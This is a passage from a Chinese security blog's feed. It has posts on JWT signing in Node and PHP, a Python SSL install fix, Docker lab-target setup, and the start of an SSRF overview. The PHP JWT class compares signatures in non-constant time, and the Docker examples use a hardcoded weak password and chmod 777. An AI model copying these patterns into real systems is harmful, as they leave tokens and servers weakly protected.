class="literal">True</span></span><br></pre></td></tr></table></figure><p>python-jose 文档：</p><p><a href="https://python-jose.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">python-jose &mdash; python-jose 0.2.0 documentation</a></p><p><strong>利用 jsonwebtoken 实现 RS256 签发/效验 JWT</strong></p><p>生成私钥 </p><p><code>ssh-keygen -t rsa -b 4096 -f jwtRS256.key</code></p><p>生成公钥 </p><p><code>openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256Public.key</code></p><p>安装 jsonwebtoken</p><p><code>sudo npm install jsonwebtoken</code></p><p>rs256.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> payload = &#123;</span><br><span class="line">        name: <span class="string">'guest'</span>,</span><br><span class="line">        admin: <span class="string">'false'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pri = fs.readFileSync(<span class="string">'./jwtRS256.key'</span>)</span><br><span class="line"><span class="keyword">const</span> pub = fs.readFileSync(<span class="string">'./jwtRS256Public.key'</span>)</span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(payload,pri,&#123;<span class="attr">algorithm</span>: <span class="string">'RS256'</span>&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(token)</span><br><span class="line"></span><br><span class="line">jwt.verify(token,pub,(error,decoded) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error.message)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(decoded)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/02/5c7a7efaeecd7.png" alt></p><p>如果需求简单可以参考</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWT</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $secret_key = <span class="string">"your secret"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$data = base64_encode($string);</span><br><span class="line">$data = str_replace(<span class="keyword">array</span>(<span class="string">'+'</span>,<span class="string">'/'</span>,<span class="string">'='</span>),<span class="keyword">array</span>(<span class="string">'-'</span>,<span class="string">'_'</span>,<span class="string">''</span>),$data);</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">$data = str_replace(<span class="keyword">array</span>(<span class="string">'-'</span>,<span class="string">'_'</span>),<span class="keyword">array</span>(<span class="string">'+'</span>,<span class="string">'/'</span>),$string);</span><br><span class="line">$mod4 = strlen($data) % <span class="number">4</span>;</span><br><span class="line">   <span class="keyword">if</span> ($mod4) &#123;</span><br><span class="line">       $data .= substr(<span class="string">'===='</span>, $mod4);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64_decode($data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">GenToken</span><span class="params">(array $header,array $payload)</span></span>&#123;</span><br><span class="line">$jwt_header = <span class="keyword">$this</span>-&gt;base64UrlEncode(json_encode($header));</span><br><span class="line">$jwt_payload = <span class="keyword">$this</span>-&gt;base64UrlEncode(json_encode($payload));</span><br><span class="line">$jwt_hap = $jwt_header.<span class="string">"."</span>.$jwt_payload;</span><br><span class="line"></span><br><span class="line">$signature = <span class="keyword">$this</span>-&gt;base64UrlEncode(hash_hmac(<span class="string">'sha256'</span>,$jwt_hap,<span class="keyword">$this</span>-&gt;secret_key,<span class="keyword">true</span>));</span><br><span class="line">$jwt_token = $jwt_hap.<span class="string">"."</span>.$signature;</span><br><span class="line">setcookie(<span class="string">"token"</span>,$jwt_token);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">VerToken</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">$token_data = explode(<span class="string">'.'</span>,$string);</span><br><span class="line">$jwt_hap = $token_data[<span class="number">0</span>].<span class="string">"."</span>.$token_data[<span class="number">1</span>];</span><br><span class="line">$signature = <span class="keyword">$this</span>-&gt;base64UrlEncode(hash_hmac(<span class="string">'sha256'</span>,$jwt_hap,<span class="keyword">$this</span>-&gt;secret_key,<span class="keyword">true</span>));</span><br><span class="line"><span class="keyword">if</span> ($signature === $token_data[<span class="number">2</span>])&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decodeTokenAndGetjwtpart</span><span class="params">($string,$part)</span></span>&#123;</span><br><span class="line">$token_data = explode(<span class="string">'.'</span>,$string);</span><br><span class="line"><span class="keyword">if</span> ($part === <span class="string">'header'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;base64UrlDecode($token_data[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($part === <span class="string">'payload'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;base64UrlDecode($token_data[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> flase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isExpiration</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$json_pay_data = <span class="keyword">$this</span>-&gt;decodeTokenAndGetjwtpart($string,<span class="string">'payload'</span>);</span><br><span class="line">$exp = json_decode($json_pay_data)-&gt;exp;</span><br><span class="line"><span class="keyword">if</span> ($exp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (time()&gt;intval($exp))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$jwt = <span class="keyword">new</span> JWT();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最好使用HTTPS协议加密传输内容</p><p><strong>客户端</strong></p><p>用户的状态在服务端的内存中是不存储的，所以这是一种无状态的认证机制，数据储存在客户端。</p><p>如果不跨域，可将JWT放在Cookie中自动发送，跨越请求时将JWT放在POST数据中</p><p>较好的方式是放在Authorization请求字段中</p><p><code>Authorization: Bearer &lt;token&gt;</code></p><h3 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h3><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><p><a href="https://tools.ietf.org/html/rfc7519" target="_blank" rel="noopener">RFC 7519 - JSON Web Token (JWT)</a></p><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;JSON Web Token 是一个开放标准( RFC 7519 )，它定义了一种紧凑且独立的方式，以 JSON 对象的形式在各方之间安全地传输信息。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="JWT" scheme="http://j0k3r.top/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>有关python 3.7 pip 出现 TLS/SSL not available</title>
    <link href="http://j0k3r.top/2019/02/17/SslNotAvailable/"/>
    <id>http://j0k3r.top/2019/02/17/SslNotAvailable/</id>
    <published>2019-02-16T16:00:00.000Z</published>
    <updated>2019-03-03T06:49:19.685Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近重装了macOS，半夜用python3发现这问题，结果弄到两点半。。</p></blockquote><a id="more"></a><p>起因是brew安装工具是由于依赖关系安装了python3.7，之后在我使用python3.7的pip安装模块时出现问题</p><p><img src="https://i.loli.net/2019/02/17/5c685829d85f4.png" alt></p><p>明显是SSL模块不可用</p><p><img src="https://i.loli.net/2019/02/17/5c685869c7792.png" alt></p><p>那就装呗，but，我几乎试遍网上方法也不管用</p><p>查看安装路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ brew --prefix openssl</span><br><span class="line">/usr/local/opt/openssl</span><br></pre></td></tr></table></figure><p>尝试带ssl重新编译安装python3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/python37 --with-openssl=/usr/local/opt/openssl</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>依然是</p><p><code>ModuleNotFoundError: No module named &#39;_ssl&#39;</code></p><p>让 brew 强制链接 openssl 到环境变量</p><p><code>brew link openssl --force</code></p><p>但是 brew 拒绝链接，警告如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Warning: Refusing to link macOS-provided software: openssl</span><br><span class="line">If you need to have openssl first in your PATH run:</span><br><span class="line">  echo &apos;export PATH=&quot;/usr/local/opt/openssl/bin:$PATH&quot;&apos; &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line">For compilers to find openssl you may need to set:</span><br><span class="line">  export LDFLAGS=&quot;-L/usr/local/opt/openssl/lib&quot;</span><br><span class="line">  export CPPFLAGS=&quot;-I/usr/local/opt/openssl/include&quot;</span><br><span class="line"></span><br><span class="line">For pkg-config to find openssl you may need to set:</span><br><span class="line">  export PKG_CONFIG_PATH=&quot;/usr/local/opt/openssl/lib/pkgconfig&quot;</span><br></pre></td></tr></table></figure><p>尝试手动创建软连接，通过 brew 安装的 OpenSSL 的头文件位于 /usr/local/Cellar/openssl/1.0.2q/include/openssl 文件夹内，在终端内执行：</p><p><code>ln -s /usr/local/Cellar/openssl/1.0.2q/include/openssl /usr/local/include</code></p><p>又设置环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ export CFLAGS=&quot;-I/usr/local/opt/openssl/include&quot;</span><br><span class="line">$ export LDFLAGS=&quot;-L/usr/local/opt/openssl/lib&quot;</span><br></pre></td></tr></table></figure><p>在编译时设置 LDFLAGS 与 CPPFLAGS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure CPPFLAGS=&quot;-I/usr/local/opt/openssl/include&quot; LDFLAGS=&quot;-L/usr/local/opt/openssl/lib&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>依然无法解决问题</p><p><strong>最终想起</strong>很久之前python3是用python-3.7.2-macosx10.9 02-30-21-902.pkg这种安装器装的</p><p>然后我抱着试试的心态，通过python3的installer安装路径为/Library/Frameworks/Python.framework/Versions/3.7/bin/python3</p><p><img src="https://i.loli.net/2019/02/17/5c68592e5fe70.png" alt></p><p>解决了，WTF</p><p><img src="https://i.loli.net/2019/02/17/5c692511ea73e.png" alt></p><p><strong>原来是 installer 包含了 private copies of OpenSSL 1.1.0</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;最近重装了macOS，半夜用python3发现这问题，结果弄到两点半。。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://j0k3r.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Docker 靶机搭建</title>
    <link href="http://j0k3r.top/2019/02/10/docker-notes/"/>
    <id>http://j0k3r.top/2019/02/10/docker-notes/</id>
    <published>2019-02-09T16:00:00.000Z</published>
    <updated>2019-02-18T12:15:38.502Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前因为出题和测试，也会些 Docker，但本文将进行一个更系统、详细的学习</p></blockquote><a id="more"></a><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><strong>Linux</strong></p><p><code>sudo apt-get install docker.io</code></p><p><strong>MacOS</strong></p><p>官网下载，目前最新是 Docker Desktop</p><p><img src="https://i.loli.net/2019/01/24/5c499e0905600.png" alt="d4"></p><p><strong>Windows</strong></p><p>需开启Hyper-V，然后下载 Docker Desktop for windows 安装</p><p><strong>添加国内镜像源</strong></p><p>在registry-mirrors中添加<a href="https://registry.docker-cn.com，或者使用阿里云镜像加速" target="_blank" rel="noopener">https://registry.docker-cn.com，或者使用阿里云镜像加速</a></p><h3 id="0x01-拉取镜像测试与基本命令"><a href="#0x01-拉取镜像测试与基本命令" class="headerlink" title="0x01 拉取镜像测试与基本命令"></a>0x01 拉取镜像测试与基本命令</h3><p>安装好Docker后</p><p>可以使用<code>docker search</code>在Docker Hub搜索需要的镜像，然后<code>docker pull</code>拉取下来，就可以在<code>docker images</code>里看到刚才pull的镜像了</p><p>接着使用run在<strong>新容器</strong>中使用一个命令, 比如</p><p><img src="https://i.loli.net/2019/01/24/5c498ca985c9c.png" alt="d1"></p><p><code>-t</code> 分配一个伪TTY</p><p><code>-i</code> 保持STDIN打开, 即交互模式</p><p>注意run和exec的区别，他们都是运行一个命令，但exec是在running container中使用</p><p><code>docker ps -n 2 -s</code> 查看最近2个运行的容器以及大小</p><p><img src="https://i.loli.net/2019/01/24/5c4991871702e.png" alt="d2"></p><p><code>docker ps -a -q</code> 列出全部运行容器ID</p><p><img src="https://i.loli.net/2019/01/24/5c4992682df8d.png" alt="d3"></p><p><strong>其他常用命令</strong></p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>docker –help/-h</td><td>查看帮助</td></tr><tr><td>docker attach</td><td>直接与容器交互，但必须是running container</td></tr><tr><td>docker rm</td><td>删除容器</td></tr><tr><td>docker rmi</td><td>删除镜像</td></tr><tr><td>docker stop [id]</td><td>停止该容器</td></tr><tr><td>docker start [id]</td><td>启动该容器</td></tr><tr><td>docker cp [id]:[path] [host path]</td><td>copy 容器内文件到主机</td></tr><tr><td>docker diff [id]</td><td>查看容器储存层的改动</td></tr></tbody></table><p><strong>注：</strong></p><p>docker commit 是对镜像的分层操作，改动仅发生在当前这层，每次commit，上一层的东西不会消失，会使镜像变得臃肿</p><h3 id="0x02-编写Dockerfile"><a href="#0x02-编写Dockerfile" class="headerlink" title="0x02 编写Dockerfile"></a>0x02 编写Dockerfile</h3><blockquote><p> Dockerfile是由一系列命令和参数构成的脚本，这些命令应用于拉取的基础镜像并最终创建一个新的镜像，通过Dockerfile我们可以创建一个你需要的镜像，里面是包含了你要安装的软件，相当于是提前定制好要安装的拓展，执行的命令等，然后一键执行，极大地简化操作流程</p></blockquote><p>当 Docker Hub 上的镜像无法直接满足需求时，通常用 Dockerfile 来定制镜像以满足不同场合的需求</p><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>Dockerfile 第一条指令<strong>必须</strong>是FROM指定基础镜像，这里的镜像一般都是能 docker search 到的</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line">RUN echo &quot;&lt;?php echo &apos;It&apos;s work!&apos;; ?&gt;&quot; &gt; /usr/share/nginx/html/index.php</span><br></pre></td></tr></table></figure><p><strong>Docker Hub 上一些高质量官方镜像：</strong></p><p>nginx、redis、mongo、mysql、httpd、php、tomcat</p><p>node、openjdk、python、ruby、golang … …</p><p><strong>基础的操作系统镜像:</strong></p><p>ubuntu、debian、centos、fedora、alpine … ….</p><p><strong>空白镜像：</strong></p><p>scratch</p><p>如 ：<code>FROM scratch</code>, 表示不需要有操作系统提供运行时支持，接下来所写的指令将作为镜像第一层，比较适合 Linux 下静态编译的程序，如Go语言开发</p><h4 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h4><p>RUN 其实就是执行shell命令，有点像写shell脚本</p><p>需要注意的是每一个RUN相当于commit新建一层镜像，这就容易造成上文说的镜像臃肿，要么删掉垃圾文件，要么尽量使用更少的RUN</p><p>如以下格式安装Apache+PHP+Mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">RUN apt-get update \</span><br><span class="line">&amp;&amp; apt-get upgrade \</span><br><span class="line">&amp;&amp; apt-get install apache2 php7.2 libapache2-mod-php7.2 \</span><br><span class="line">&amp;&amp; apt-get install mysql-server \</span><br><span class="line">&amp;&amp; apt-get install php7.2-curl \</span><br><span class="line">&amp;&amp; chmod 777 /var/www/html</span><br></pre></td></tr></table></figure><p><code>\</code> 表换行，<code>&amp;&amp;</code> 连接命令</p><h4 id="CPOPY-amp-ADD"><a href="#CPOPY-amp-ADD" class="headerlink" title="CPOPY &amp; ADD"></a>CPOPY &amp; ADD</h4><p>两者都可以将主机上的资源复制或加入到容器镜像，区别是ADD可以通过URL读取网络资源复制到镜像内，且ADD会自解压源归档文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WORKDIR /var/www/html</span><br><span class="line">COPY [&quot;test/&quot;, &quot;.&quot;] #写法一</span><br><span class="line">COPY test/ .        #写法二</span><br><span class="line">ADD pkg.tar /pkg</span><br></pre></td></tr></table></figure><p>#### </p><p><strong>添加.dockerignore文件让Docker忽视一些目录或文件</strong></p><p>规则与shell的通配符类似，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 注释</span><br><span class="line">/tmp/log*</span><br><span class="line">*/log*</span><br><span class="line">log*</span><br></pre></td></tr></table></figure><p>构建好镜像就可以run了,比如</p><p><code>docker run -p 7778:80 -d php:php1</code></p><h3 id="Compose"><a href="#Compose" class="headerlink" title="Compose"></a>Compose</h3><p>很多概念最好到《Docker —— 从入门到实践》的gitbook或Docker官方文档学习</p><p>一个容器中最好只运行一个主进程，如两个容器分别运行apache、mysql以提高整体效率，简化部署工作量。这时就需要 Compose 通过默认名为docker-compose.yml 的 Compose file 定义一组相关联的应用容器为一个项目以便管理。</p><p>docker compose file有1、2、2.x和3.x版本，部分语法支持程度不同</p><p>比如在 Compose file 中设置 networks 指定ip 要使用2.x版本，下面是我的一个示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">version: &apos;2.1&apos;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  mysql:</span><br><span class="line">    image: mysql:5.7</span><br><span class="line">    command: --default-authentication-plugin=mysql_native_password</span><br><span class="line">    container_name: mysql</span><br><span class="line">    volumes:</span><br><span class="line">      - ./db/database:/var/lib/mysql</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;33070:3306&quot;</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=1qaz2wsx</span><br><span class="line">    networks:</span><br><span class="line">      vpcbr:</span><br><span class="line">        ipv4_address: 10.3.0.3</span><br><span class="line"></span><br><span class="line">  web:</span><br><span class="line">    #image: php:7.2.2-apache</span><br><span class="line">    build: .</span><br><span class="line">    container_name: php_7.2.2_apache_For_web_chou</span><br><span class="line">    volumes:</span><br><span class="line">      - ./html:/var/www/html/</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;12345:80&quot;</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_USER=chou</span><br><span class="line">      - MYSQL_PASSWORD=1qaz2wsx</span><br><span class="line">      - PHP_TZ=Asia/Shanghai</span><br><span class="line">    networks:</span><br><span class="line">      vpcbr:</span><br><span class="line">        ipv4_address: 10.3.0.2</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  vpcbr:</span><br><span class="line">    driver: bridge</span><br><span class="line">    ipam:</span><br><span class="line">      driver: default</span><br><span class="line">      config:</span><br><span class="line">       - subnet: 10.3.0.0/16</span><br></pre></td></tr></table></figure><p>指定ip其实有些麻烦，可以使用link，具体见<a href="https://yq.aliyun.com/articles/55912" target="_blank" rel="noopener">深入理解docker的link机制</a>,其实就是通过改hosts确定容器地址，还有一些环境变量之类的功能</p><p>但有时候link不好使，也可以指定ip，桥接到主机的物理网卡</p><p>出现<code>ERROR: Pool overlaps with other one on this address space</code>是因为目标网段已经存在，删除网段对应的网卡或更改subnet网段地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br><span class="line">列出docker网卡信息</span><br><span class="line"></span><br><span class="line">docker network rm 网卡id</span><br><span class="line">删除指定的docker网卡</span><br><span class="line"></span><br><span class="line">docker network inspect 网卡id</span><br><span class="line">查看该docker网卡的配置信息</span><br></pre></td></tr></table></figure><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>compose build</td><td>(构建yml中某个服务的镜像)</td></tr><tr><td>compose ps</td><td>(查看已经启动的服务状态）</td></tr><tr><td>compose kill</td><td>(停止某个服务）</td></tr><tr><td>compose logs</td><td>(可以查看某个服务的log）</td></tr><tr><td>compose port</td><td>(打印绑定的public port）</td></tr><tr><td>compose pull</td><td>(pull服务镜像)</td></tr><tr><td>compose up</td><td>(启动yml定义的所有服务）</td></tr><tr><td>compose stop</td><td>(停止yml中定义的所有服务）</td></tr><tr><td>compose start</td><td>(启动被停止的yml中的所有服务）</td></tr><tr><td>compose kill</td><td>(强行停止yml中定义的所有服务）</td></tr><tr><td>compose rm</td><td>（删除yml中定义的所有服务）</td></tr><tr><td>compose restart</td><td>(重启yml中定义的所有服务）</td></tr><tr><td>compose scale</td><td>(扩展某个服务的个数，可以向上或向下）</td></tr><tr><td>compose migrate-to-labels</td><td>(这个没有实际尝试。根据介绍是将服务从1.2迁移到1.3带labels的版本。docker之前不支持label）</td></tr><tr><td>compose version</td><td>（查看compose的版本）</td></tr></tbody></table><p>Reference：</p><p><a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/</a></p><p><a href="https://docs.docker.com" target="_blank" rel="noopener">https://docs.docker.com</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;之前因为出题和测试，也会些 Docker，但本文将进行一个更系统、详细的学习&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="docker" scheme="http://j0k3r.top/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>SSRF小结</title>
    <link href="http://j0k3r.top/2019/01/30/SSRF/"/>
    <id>http://j0k3r.top/2019/01/30/SSRF/</id>
    <published>2019-01-29T16:00:00.000Z</published>
    <updated>2019-01-30T22:03:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>即恶意使用Web应用作为代理攻击其他本地或远程服务器的攻击方法，称其为服务端请求伪造攻击（Server-side Request Forgery），常用来探测内网，攻击内网应用</p></blockquote><a id="more"></a><h2 id="后端实现与出现场景"><a href="#后端实现与出现场景" class="headerlink" title="后端实现与出现场景"></a>后端实现与出现场景</h2><h3 id="PHP常见有三种"><a href="#PHP常见有三种" class="headerlink" title="PHP常见有三种"></a>PHP常见有三种</h3><ul><li>file_get_contents </li></ul><p>file_get_contents也可以直接获取用户指定URL的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$homepage = file_get_contents(<span class="string">'http://www.example.com/'</span>);</span><br><span class="line"><span class="keyword">echo</span> $homepage;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>fsockopen</li></ul><p>fsockopen — 打开一个网络连接或者一个Unix套接字连接，跟服务器建立tcp连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span 